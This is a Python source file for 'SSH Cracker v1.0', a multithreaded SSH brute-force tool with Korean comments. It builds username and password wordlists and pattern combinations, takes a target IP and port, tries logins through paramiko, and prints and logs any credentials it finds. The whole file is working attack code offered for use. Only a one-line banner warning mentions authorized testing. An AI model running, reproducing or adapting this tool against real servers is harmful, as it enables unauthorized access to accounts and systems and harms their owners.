import paramiko
import threading
import os
import sys
import warnings
import time
import random
import logging
import socket
import subprocess
import string
from datetime import datetime
from typing import List, Tuple, Optional, Dict
from colorama import init, Fore, Style
import itertools

# Initialize colorama
init()

# Configure logging
logging.basicConfig(
    filename='ssh_cracker.log',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

class SSHCracker:
    def __init__(self):
        self.ssh_creds: List[Tuple[str, str]] = []
        self.active_threads = 0
        self.lock = threading.Lock()
        self.found_credentials: Optional[Tuple[str, str]] = None
        self.stop_event = threading.Event()
        self.common_usernames = ['root', 'admin', 'user', 'test', 'guest']
        self.common_passwords = ['password', '123456', 'admin', 'root', 'test']
        self.password_patterns = [
            # 숫자만
            string.digits,
            # 소문자만
            string.ascii_lowercase,
            # 대문자만
            string.ascii_uppercase,
            # 소문자 + 숫자
            string.ascii_lowercase + string.digits,
            # 대문자 + 숫자
            string.ascii_uppercase + string.digits,
            # 소문자 + 대문자
            string.ascii_letters,
            # 모든 문자
            string.ascii_letters + string.digits + string.punctuation
        ]
        self.special_chars = '!@#$%^&*()_+-=[]{}|;:,.<>?'
        self.wordlist = self.load_wordlist()

    def load_wordlist(self) -> List[str]:
        """기본 단어 목록을 로드합니다."""
        common_words = [
            'password', 'admin', 'root', 'test', '123456', 'qwerty',
            'letmein', 'welcome', 'monkey', 'dragon', 'master', 'sunshine',
            'football', 'baseball', 'mustang', 'access', 'shadow', 'superman',
            'batman', 'starwars', 'matrix', 'trustno1', 'jordan', 'harley',
            'ranger', 'iwantu', 'minnie', 'pepper', 'snoopy', 'guitar',
            'chelsea', 'black', 'diamond', 'nascar', 'computer', 'amanda',
            'summer', 'george', 'hello', 'secret', 'freedom', 'whatever',
            'thomas', 'soccer', 'hockey', 'killer', 'george', 'asshole',
            'jessica', 'pepper', '131313', 'madison', 'whatever', 'steelers',
            'joseph', 'snoopy', 'boomer', 'whatever', 'merlin', 'cookie',
            'summer', 'george', 'hello', 'secret', 'freedom', 'whatever'
        ]
        return common_words

    def generate_password_patterns(self, length: int = 8) -> List[str]:
        """다양한 패턴의 비밀번호를 생성합니다."""
        passwords = []
        
        # 기본 단어 목록에서 생성
        for word in self.wordlist:
            # 단어 그대로
            passwords.append(word)
            # 첫 글자 대문자
            passwords.append(word.capitalize())
            # 모든 글자 대문자
            passwords.append(word.upper())
            # 숫자 추가
            for i in range(10):
                passwords.append(f"{word}{i}")
                passwords.append(f"{i}{word}")
                passwords.append(f"{word.capitalize()}{i}")
                passwords.append(f"{i}{word.capitalize()}")
        
        # 특수 문자 추가
        for word in self.wordlist:
            for char in self.special_chars:
                passwords.append(f"{word}{char}")
                passwords.append(f"{char}{word}")
                passwords.append(f"{word.capitalize()}{char}")
                passwords.append(f"{char}{word.capitalize()}")
        
        # 무작위 조합 생성
        for pattern in self.password_patterns:
            for _ in range(100):
                password = ''.join(random.choices(pattern, k=length))
                passwords.append(password)
        
        # 연도 추가
        current_year = datetime.now().year
        for year in range(current_year - 10, current_year + 1):
            passwords.append(str(year))
            for word in self.wordlist:
                passwords.append(f"{word}{year}")
                passwords.append(f"{year}{word}")
        
        return list(set(passwords))  # 중복 제거

    def generate_brute_force_combinations(self, min_length: int = 4, max_length: int = 8) -> List[str]:
        """무차별 대입을 위한 모든 가능한 조합을 생성합니다."""
        combinations = []
        chars = string.ascii_letters + string.digits + string.punctuation
        
        for length in range(min_length, max_length + 1):
            for combo in itertools.product(chars, repeat=length):
                combinations.append(''.join(combo))
                if len(combinations) >= 10000:  # 메모리 제한
                    break
            if len(combinations) >= 10000:
                break
        
        return combinations

    def generate_smart_combinations(self) -> List[str]:
        """스마트한 비밀번호 조합을 생성합니다."""
        combinations = []
        
        # 일반적인 패턴
        patterns = [
            # 사용자 이름 + 숫자
            lambda u: [f"{u}{i}" for i in range(100)],
            # 사용자 이름 + 특수문자
            lambda u: [f"{u}{c}" for c in self.special_chars],
            # 사용자 이름 + 연도
            lambda u: [f"{u}{y}" for y in range(2000, 2024)],
            # 사용자 이름 + 월일
            lambda u: [f"{u}{m:02d}{d:02d}" for m in range(1, 13) for d in range(1, 32)],
            # 사용자 이름 + 회사명
            lambda u: [f"{u}@company", f"{u}@corp", f"{u}@inc"],
            # 사용자 이름 + 도시명
            lambda u: [f"{u}@seoul", f"{u}@busan", f"{u}@daegu"],
            # 사용자 이름 + 직위
            lambda u: [f"{u}@admin", f"{u}@manager", f"{u}@staff"]
        ]
        
        for username in self.common_usernames:
            for pattern in patterns:
                combinations.extend(pattern(username))
        
        return combinations

    def generate_all_combinations(self) -> List[Tuple[str, str]]:
        """모든 가능한 조합을 생성합니다."""
        combinations = []
        
        # 1. 일반적인 사용자 이름과 비밀번호 조합
        for username in self.common_usernames:
            for password in self.common_passwords:
                combinations.append((username, password))
        
        # 2. 스마트한 조합
        smart_passwords = self.generate_smart_combinations()
        for username in self.common_usernames:
            for password in smart_passwords:
                combinations.append((username, password))
        
        # 3. 무작위 조합
        random_passwords = self.generate_password_patterns()
        for username in self.common_usernames:
            for password in random_passwords:
                combinations.append((username, password))
        
        # 4. 무차별 대입 조합
        brute_force_passwords = self.generate_brute_force_combinations()
        for username in self.common_usernames:
            for password in brute_force_passwords:
                combinations.append((username, password))
        
        return list(set(combinations))  # 중복 제거

    def print_banner(self):
        """프로그램 배너를 출력합니다."""
        banner = f"""
{Fore.CYAN}╔════════════════════════════════════════════════════════════╗
║                                                          ║
║  {Fore.YELLOW}███████╗███████╗██╗  ██╗ ██████╗██████╗  █████╗  ██████╗██╗  ██╗{Fore.CYAN}  ║
║  {Fore.YELLOW}██╔════╝██╔════╝██║  ██║██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝{Fore.CYAN}  ║
║  {Fore.YELLOW}███████╗███████╗███████║██║     ██████╔╝███████║██║     █████╔╝ {Fore.CYAN}  ║
║  {Fore.YELLOW}╚════██║╚════██║██╔══██║██║     ██╔══██╗██╔══██║██║     ██╔═██╗ {Fore.CYAN}  ║
║  {Fore.YELLOW}███████║███████║██║  ██║╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗{Fore.CYAN}  ║
║  {Fore.YELLOW}╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝{Fore.CYAN}  ║
║                                                          ║
║  {Fore.WHITE}SSH 크래커 v1.0 - 보안 테스트 도구                        {Fore.CYAN}  ║
║  {Fore.WHITE}개발자: bigboss                                        {Fore.CYAN}  ║
║                                                          ║
╚════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
"""
        print(banner)
        print(f"{Fore.RED}경고: 이 도구는 허가된 보안 테스트 목적으로만 사용해야 합니다.{Style.RESET_ALL}\n")

    def log_attack_result(self, success: bool, username: Optional[str] = None, password: Optional[str] = None):
        """공격 결과를 로그에 기록합니다."""
        who = "공격자"
        when = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        where = "대상 서버"
        what = "SSH 로그인 시도"
        how = f"사용자 이름: {username}, 비밀번호: {password}" if success else "로그인 실패"
        why = "보안 테스트 목적"
        
        result = "성공" if success else "실패"
        logging.info(f"결과: {result}, 누가: {who}, 언제: {when}, 어디서: {where}, 무엇을: {what}, 어떻게: {how}, 왜: {why}")

    def try_login(self, host: str, port: int, username: str, password: str, timeout: int, max_retries: int = 3) -> bool:
        """SSH 로그인을 시도합니다."""
        with self.lock:
            self.active_threads += 1
        
        attempt = 0
        while attempt < max_retries and not self.stop_event.is_set():
            try:
                # SSH 클라이언트 생성
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                
                # 연결 시도
                client.connect(host, port=port, username=username, password=password, timeout=timeout)
                
                # 성공 시 자격 증명 저장
                self.found_credentials = (username, password)
                self.stop_event.set()  # 다른 스레드 중지
                
                # 로그 기록
                logging.info(f'Successful login: {username}:{password}')
                self.log_attack_result(True, username, password)
                
                return True
                
            except paramiko.AuthenticationException:
                logging.warning(f'Authentication failed for {username}:{password}')
                self.log_attack_result(False)
                break
                
            except paramiko.SSHException as e:
                logging.error(f'SSH error: {str(e)}')
                self.log_attack_result(False)
                break
                
            except Exception as e:
                logging.error(f'Unexpected error: {str(e)}')
                if 'timed out' in str(e):
                    logging.info(f'Timeout occurred for {username}:{password} on attempt {attempt + 1}')
                    attempt += 1
                    if attempt < max_retries:
                        logging.info(f'Retrying... ({attempt}/{max_retries})')
                        time.sleep(2)
                    else:
                        logging.error(f'Failed after {max_retries} attempts due to timeout.')
                else:
                    break
                    
            finally:
                with self.lock:
                    self.active_threads -= 1
                    
        return False

    def run_attack(self, host: str, port: int, thread_count: int, timeout: int, wait_time: float) -> Dict:
        """SSH 공격을 실행합니다."""
        try:
            # 자격 증명 목록 생성
            self.ssh_creds = self.generate_all_combinations()
            random.shuffle(self.ssh_creds)
            
            # 공격 시작 로그
            logging.info('Starting brute force attack')
            
            # 스레드 생성 및 실행
            threads = []
            for username, password in self.ssh_creds:
                if self.stop_event.is_set():
                    break
                    
                thread = threading.Thread(
                    target=self.try_login,
                    args=(host, port, username, password, timeout)
                )
                thread.daemon = True
                thread.start()
                threads.append(thread)
                
                # 스레드 수 제한
                while self.active_threads >= thread_count:
                    time.sleep(0.1)
                
                # 대기 시간 적용
                if wait_time > 0:
                    time.sleep(wait_time / 1000)
            
            # 모든 스레드 완료 대기
            for thread in threads:
                thread.join()
            
            # 결과 반환
            if self.found_credentials:
                return {
                    'status': 'success',
                    'credentials': {
                        'username': self.found_credentials[0],
                        'password': self.found_credentials[1]
                    }
                }
            else:
                return {
                    'status': 'failed',
                    'error': 'No valid credentials found'
                }
                
        except Exception as e:
            return {
                'status': 'error',
                'error': str(e)
            }

    def get_user_input(self) -> Tuple[str, int, int, int, float]:
        """사용자로부터 입력을 받습니다."""
        while True:
            try:
                host = input(f'{Fore.CYAN}[+] 서버 IP: {Style.RESET_ALL}').strip()
                if not host:
                    raise ValueError('서버 IP는 비워둘 수 없습니다.')
                
                port = input(f'{Fore.CYAN}[+] SSH 포트 (기본값 22): {Style.RESET_ALL}').strip()
                port = int(port) if port else 22
                if not (1 <= port <= 65535):
                    raise ValueError('포트 번호는 1과 65535 사이여야 합니다.')
                
                thread_count = input(f'{Fore.CYAN}[+] 스레드 수 (기본값 10): {Style.RESET_ALL}').strip()
                thread_count = int(thread_count) if thread_count else 10
                
                timeout = input(f'{Fore.CYAN}[+] 연결 시간 초과 (초 단위): {Style.RESET_ALL}').strip()
                timeout = int(timeout) if timeout else 30
                
                wait_time = input(f'{Fore.CYAN}[+] 밀리초 대기 시간 (기본값 100|0=None): {Style.RESET_ALL}').strip()
                wait_time = float(wait_time) if wait_time else 100.0
                
                return host, port, thread_count, timeout, wait_time
                
            except ValueError as ve:
                print(f'{Fore.RED}[!] 잘못된 입력: {str(ve)}{Style.RESET_ALL}')
            except Exception as e:
                print(f'{Fore.RED}[!] 오류 발생: {str(e)}{Style.RESET_ALL}')

def main():
    """메인 함수"""
    # 화면 클리어
    os.system('cls' if os.name == 'nt' else 'clear')
    
    # SSHCracker 인스턴스 생성
    cracker = SSHCracker()
    
    # 배너 출력
    cracker.print_banner()
    
    # 사용자 입력 받기
    host, port, thread_count, timeout, wait_time = cracker.get_user_input()
    
    # 공격 확인
    print(f'\n{Fore.YELLOW}[*] 공격 설정:')
    print(f'    - 대상 서버: {host}:{port}')
    print(f'    - 스레드 수: {thread_count}')
    print(f'    - 타임아웃: {timeout}초')
    print(f'    - 대기 시간: {wait_time}ms{Style.RESET_ALL}')
    
    input(f'\n{Fore.YELLOW}[!] 공격을 시작하려면 ENTER를 누르세요...{Style.RESET_ALL}')
    
    # 공격 실행
    print(f'\n{Fore.CYAN}[*] 공격을 시작합니다...{Style.RESET_ALL}')
    result = cracker.run_attack(host, port, thread_count, timeout, wait_time)
    
    # 결과 출력
    if result['status'] == 'success':
        print(f'\n{Fore.GREEN}[+] 공격 성공!{Style.RESET_ALL}')
        print(f'    사용자 이름: {result["credentials"]["username"]}')
        print(f'    비밀번호: {result["credentials"]["password"]}')
    else:
        print(f'\n{Fore.RED}[-] 공격 실패: {result.get("error", "알 수 없는 오류")}{Style.RESET_ALL}')

if __name__ == '__main__':
    main() 